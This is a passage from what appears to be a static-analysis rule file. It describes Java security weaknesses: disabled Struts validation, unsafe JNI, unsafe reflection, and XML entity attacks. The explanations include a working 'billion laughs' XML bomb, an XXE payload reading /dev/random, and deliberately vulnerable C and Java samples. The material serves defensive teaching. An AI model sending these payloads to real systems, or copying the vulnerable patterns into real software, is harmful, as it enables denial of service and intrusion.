																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_validator_turned_off
		</key>
		<internalKey>Input Validation and Representation/Struts/Validator
			Turned Off
		</internalKey>
		<name>Struts: Validator Turned Off</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  This action form mapping disables the form's <code>validate()</code> method.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An action form mapping should never disable validation. Disabling validation disables the Struts Validator as well as any custom validation logic performed by the form.<br><br><b>Example:</b> An action form mapping that disables validation.<br><br><pre><br>&lt;action path="/download"<br>type="com.website.d2.action.DownloadAction"<br>name="downloadForm"<br>scope="request"<br>input=".download"<br>validate="false"&gt;<br>&lt;/action&gt;<br></pre><br><br>Disabling validation exposes this action to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 109</em> <br></p>
																									   <p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[16] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[17]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_struts_validator_without_form_field
		</key>
		<internalKey>Input Validation and Representation/Struts/Validator
			Without Form Field
		</internalKey>
		<name>Struts: Validator Without Form Field</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  It is easy for developers to forget to update validation logic when they make changes to an <code>ActionForm</code> class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.<br><br><b>Example 1.a:</b> An action form with two fields.<br><br><pre><br>    public class DateRangeForm extends ValidatorForm {<br>    String startDate, endDate;<br>    public void setStartDate(String startDate) {<br>        this.startDate = startDate;<br>    }<br>    public void setEndDate(String endDate) {<br>        this.endDate = endDate;<br>    }<br>}<br></pre><br><br>Example 1.a shows an action form that has two fields, <code>startDate</code> and <code>endDate</code>.<br><br><b>Example 1.b:</b> A validation form with a third field.<br><br><pre><br>&lt;form name="DateRangeForm"&gt;<br>    &lt;field property="startDate" depends="date"&gt;<br>        &lt;arg0 key="start.date"/&gt;<br>    &lt;/field&gt;<br>    &lt;field property="endDate" depends="date"&gt;<br>         &lt;arg0 key="end.date"/&gt;<br>    &lt;/field&gt;<br>    &lt;field property="scale" depends="integer"&gt;<br>         &lt;arg0 key="range.scale"/&gt;<br>    &lt;/field&gt;<br>&lt;/form&gt;<br></pre><br><br>Example 1.b lists a validation form for the action form. The validation form lists a third field: <code>scale</code>. The presence of the third field suggests that <code>DateRangeForm</code> was modified without taking validation into account.<br><br>It is critically important that validation logic be maintained and kept in sync with the rest of the application. Unchecked input is the root cause of some of today's worst and most common software security problems. Cross-site scripting, SQL injection, and process control vulnerabilities all stem from incomplete or absent input validation. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 110</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] T. Husted et al. <em>Struts in Action: Building Web Applications with the Leading Java Framework</em> Manning Publications<br></p>
																									   <p>[15]  <em>The Struts project</em> The Apache Foundation<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_system_information_leak_struts_2
		</key>
		<internalKey>Input Validation and Representation/System Information
			Leak/Struts 2
		</internalKey>
		<name>System Information Leak: Struts 2</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Revealing system data or debugging information helps an adversary learn about the system and form a plan of attack.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  An information leak occurs when system data or debugging information leaves the program through an output stream or logging function.<br><br>In this case the Struts 2 Config Browser is configured in the maven pom.xml file and so it is available and deployed along the application.<br><br>The Config Browser plugin is a debugging tool to help view an application's configuration at runtime. It is very useful when debugging problems that could be related to configuration issues but it exposes too many details that may help an attacker to map and model the application.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 497</em> <br></p>
																									   <p>[12] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Information Leakage</em> <br></p>
																									   <p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-11 Error Handling (P2)</em> <br></p>
																									   <p>[19]  <em>Struts 2 Config Browser Plugin</em> Apache Struts 2<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_unsafe_jni</key>
		<internalKey>Input Validation and Representation/Unsafe JNI
		</internalKey>
		<name>Unsafe JNI</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Improper use of the Java Native Interface (JNI) can render Java applications vulnerable to security flaws in other languages. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Unsafe JNI errors occur when a Java application uses JNI to call code written in another programming language.<br><br><b>Example:</b> The following Java code defines a class named <code>Echo</code>. The class declares one native method (defined below), which uses C to echo commands entered on the console back to the user.<br><br><pre><br>    class Echo {<br>	public native void runEcho();<br><br>	static {<br>		System.loadLibrary("echo");<br>		}<br><br>	public static void main(String[] args) {<br>		new Echo().runEcho();<br>		}<br>}<br></pre><br><br>The following C code defines the native method implemented in the <code>Echo</code> class:<br><br><pre><br>#include &lt;jni.h&gt;<br>#include "Echo.h" //the java class above compiled with javah<br>#include &lt;stdio.h&gt;<br><br>JNIEXPORT void JNICALL<br>Java_Echo_runEcho(JNIEnv *env, jobject obj)<br>{<br>	char buf[64];<br>	gets(buf);<br>	printf(buf);<br>}<br></pre><br><br>Because the example is implemented in Java, it may appear that it is immune to memory issues like buffer overflow vulnerabilities. Although Java does do a good job of making memory operations safe, this protection does not extend to vulnerabilities occurring in source code written in other languages that are accessed using the Java Native Interface. Despite the memory protections offered in Java, the C code in this example is vulnerable to a buffer overflow because it makes use of <code>gets()</code>, which does not perform any bounds checking on its input.<br><br>The Sun Java(TM) Tutorial provides the following description of JNI [1]:<br><br>The JNI framework lets your native method utilize Java objects in the same way that Java code uses these objects. A native method can create Java objects, including arrays and strings, and then inspect and use these objects to perform its tasks. A native method can also inspect and use objects created by Java application code. A native method can even update Java objects that it created or that were passed to it, and these updated objects are available to the Java application. Thus, both the native language side and the Java side of an application can create, update, and access Java objects and then share these objects between them.<br><br>The vulnerability in the example above could easily be detected through a source code audit of the native method implementation. This may not be practical or possible depending on the availability of the C source code and the way the project is built, but in many cases it may suffice. However, the ability to share objects between Java and native methods expands the potential risk to much more insidious cases where improper data handling in Java may lead to unexpected vulnerabilities in native code or unsafe operations in native code corrupt data structures in Java.<br><br>Vulnerabilities in native code accessed through a Java application are typically exploited in the same manner as they are in applications written in the native language. The only challenge to such an attack is for the attacker to identify that the Java application uses native code to perform certain operations. This can be accomplished in a variety of ways, including identifying specific behaviors that are often implemented with native code or by exploiting a system information leak in the Java application that exposes its use of JNI [2].
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 111</em> <br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[12] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[13] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[14] B. Stearns <em>The Java Tutorial: The Java Native Interface</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_unsafe_reflection</key>
		<internalKey>Input Validation and Representation/Unsafe Reflection
		</internalKey>
		<name>Unsafe Reflection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  An attacker may be able to create unexpected control flow paths through the application, potentially bypassing security checks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  If an attacker can supply values that the application then uses to determine which class to instantiate or which method to invoke, the potential exists for the attacker to create control flow paths through the application that were not intended by the application developers. This attack vector may allow the attacker to bypass authentication or access control checks or otherwise cause the application to behave in an unexpected manner. Even the ability to control the arguments passed to a given method or constructor may give a wily attacker the edge necessary to mount a successful attack.<br><br>This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the application's classpath or add new entries to the application's classpath. Under either of these conditions, the attacker can use reflection to introduce new, presumably malicious, behavior into the application.<br><br><b>Example:</b> A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:<br><br><pre><br>String ctl = request.getParameter("ctl");<br>Worker ao = null;<br>if (ctl.equals("Add")) {<br>  ao = new AddCommand();<br>} else if (ctl.equals("Modify")) {<br>  ao = new ModifyCommand();<br>} else {<br>  throw new UnknownActionError();<br>}<br>ao.doAction(request);<br></pre><br><br>A programmer might refactor this code to use reflection as follows:<br><br><pre><br>    String ctl = request.getParameter("ctl");<br>    Class cmdClass = Class.forName(ctl + "Command");<br>    Worker ao = (Worker) cmdClass.newInstance();<br>    ao.doAction(request);<br></pre><br><br>The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the <code>if/else</code> blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher.<br><br>However, the refactoring allows an attacker to instantiate any object that implements the <code>Worker</code> interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the <code>Worker</code> interface, they must remember to modify the dispatcher's access control code. If they fail to modify the access control code, then some <code>Worker</code> classes will not have any access control.<br><br>One way to address this access control problem is to make the <code>Worker</code> object responsible for performing the access control check. An example of the re-refactored code follows:<br><br><pre><br>String ctl = request.getParameter("ctl");<br>Class cmdClass = Class.forName(ctl + "Command");<br>Worker ao = (Worker) cmdClass.newInstance();<br><b>ao.checkAccessControl(request);</b><br>ao.doAction(request);<br></pre><br><br>Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes.<br><br>This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the <code>Worker</code> interface; the default constructor for any object in the system can be invoked. If the object does not implement the <code>Worker</code> interface, a <code>ClassCastException</code> will be thrown before the assignment to <code>ao</code>, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple applications, in larger applications where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack.<br><br>Access checks may also be compromised further down the code execution chain, if certain Java APIs that perform tasks using the immediate caller's class loader check, are invoked on untrusted objects returned by reflection calls. These Java APIs bypass the SecurityManager check that ensures all callers in the execution chain have the requisite security permissions. Care should be taken to ensure these APIs are not invoked on the untrusted objects returned by reflection as they can bypass security access checks and leave the system vulnerable to remote attacks. For more information on these Java APIs please refer to Guideline 9 of The Secure Coding Guidelines for the Java Programming Language.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3570 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 470</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16]  <em>Secure Coding Guidelines for the Java Programming Language, Version 4.0</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xml_entity_expansion_injection
		</key>
		<internalKey>Input Validation and Representation/XML Entity Expansion
			Injection
		</internalKey>
		<name>XML Entity Expansion Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using XML parsers configured to not prevent nor limit Document Type Definition (DTD) entity resolution can expose the parser to an XML Entity Expansion injection
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML Entity Expansion injection also known as XML Bombs are DoS attacks that benefit from valid and well-formed XML blocks that expand exponentially until they exhaust the server allocated resources. XML allows to define custom entities which act as string substitution macros. By nesting recurrent entity resolutions, an attacker can easily crash the server resources.<br><br>The following XML document shows an example of an XML Bomb.<br><pre><br>&lt;?xml version="1.0"?&gt;<br>&lt;!DOCTYPE lolz [<br>  &lt;!ENTITY lol "lol"&gt;<br>  &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br>  &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br>  &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br>  &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br>  &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br>  &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br>  &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br>  &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br>]&gt;<br>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br></pre><br><br>This test could crash the server by expanding the small XML document into more than 3GB in memory.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 776</em> <br></p>
																									   <p>[11] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Denial of Service</em> <br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[15] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>
																									   <p>[16]  <em>Testing for XML Injection (OWASP-DV-008)</em> OWASP<br></p>
																									   <p>[17]  <em>XML External Entities</em> The Web Application Security Consortium<br></p>
																									   <p>[18]  <em>XML External Entity (XXE) Processing</em> OWASP<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xml_external_entity_injection
		</key>
		<internalKey>Input Validation and Representation/XML External Entity
			Injection
		</internalKey>
		<name>XML External Entity Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Using XML parsers configured to not prevent nor limit external entities resolution can expose the parser to an XML External Entities attack
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML External Entities attacks benefit from an XML feature to build documents dynamically at the time of processing. An XML entity allows inclusion of data dynamically from a given resource. External entities allow an XML document to include data from an external URI. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote system. This behavior exposes the application to XML External Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.<br><br>The following XML document shows an example of an XXE attack.<br><pre><br>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;<br> &lt;!DOCTYPE foo [<br>  &lt;!ELEMENT foo ANY &gt;<br>  &lt;!ENTITY xxe SYSTEM "file:///dev/random" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<br></pre><br><br>This example could crash the server (on a UNIX system), if the XML parser attempts to substitute the entity with the contents of the /dev/random file.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3810 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3810 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3810 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3810 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 611</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18]  <em>Testing for XML Injection (OWASP-DV-008)</em> OWASP<br></p>
